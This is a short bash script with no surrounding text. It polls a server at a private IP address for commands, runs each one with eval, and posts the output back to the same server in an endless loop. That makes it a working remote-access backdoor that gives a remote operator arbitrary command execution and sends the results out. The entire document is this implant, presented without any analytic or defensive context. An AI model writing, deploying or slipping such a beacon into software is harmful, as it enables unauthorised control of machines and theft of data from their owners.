#!/bin/bash
server_ip="192.168.1.135"
while true; do
  command=$(curl -s "http://${server_ip}:8080/commands")
  if [[ -n $command ]]; then
    result=$(eval "$command" 2>&1)
    if [[ -z $result ]]; then
      result="Command had no output."
    fi
    curl -X POST -H "Content-Type: text/plain" -d "$result" "http://${server_ip}:8080/results"
  else
    :
  fi
  sleep 1
done
